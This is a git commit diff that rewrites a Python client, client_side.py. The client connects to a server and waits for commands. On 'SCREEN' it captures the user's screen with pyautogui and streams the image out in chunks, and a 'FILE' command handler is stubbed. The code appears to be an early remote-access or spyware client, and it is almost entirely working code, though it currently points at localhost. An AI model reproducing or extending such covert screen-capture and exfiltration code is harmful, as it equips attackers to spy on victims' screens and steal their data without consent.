e78fe443fef6c2262ba8ca3e4e8f46a808eefe9b
th3-5had0w <theshadow127001@gmail.com>
2023-06-08 03:16:03 -0600

    .

--- client_side.py
+++ client_side.py
@@ -1,29 +1,42 @@
 from pyautogui import screenshot
 import socket
+import io
 from pwn import *
+from time import sleep, time_ns
 
-server_addr, server_port = ()
-_server = remote(server_addr, server_port)
-# server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# server.connect((server_addr, server_port))
+IP = '127.0.0.1'
+PORT = 8000
+CHUNKSIZE = 4096
 
-def _screen():
-    capscreen = screenshot()
-    capscreen.save("pic.png")
-    bytestream = open("pic.png", "rb").read()
-    bytestream = b"\xfe\xdf\x10\x02START_OF_FILE" + bytestream + b"\xff\xff\xff\xff eof"
-    _server.send(bytestream)
-    return
+def init():
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
+    client.connect((IP, PORT))
+    return client
 
+def _screen(sock):
+    _ = screenshot()
+    pic = io.BytesIO()
+    _.save(pic, format='PNG')
+    pic = pic.getvalue()
+    pic_length = len(pic)
+    sock.send(b'\xfe\xdf\x10\x02START_OF_FILEscreenCap_'+str(time_ns()).encode()+b'.png')
+    for i in range((pic_length // CHUNKSIZE) + 1):
+        print(i)
+        sock.send(pic[CHUNKSIZE*i:CHUNKSIZE*i+CHUNKSIZE])
+    sleep(0.1)
+    sock.send(b'\xff\xff\xff\xff eof')
 
-def _file():
+def _file(sock):
     pass
 
-def wait_command():
-    cmd = server.recvline(0).decode()
-    if cmd == "SCREEN":
-        _screen()
-    elif cmd == "FILE":
-        _file()
+def main():
+    sock = init()
+    while (1):
+        _ = sock.recv(256)
+        if (_ == b'SCREEN'):
+            _screen(sock)
+        elif (_ == b'FILE'):
+            _file(sock)
 
-
+if __name__=='__main__':
+    main()
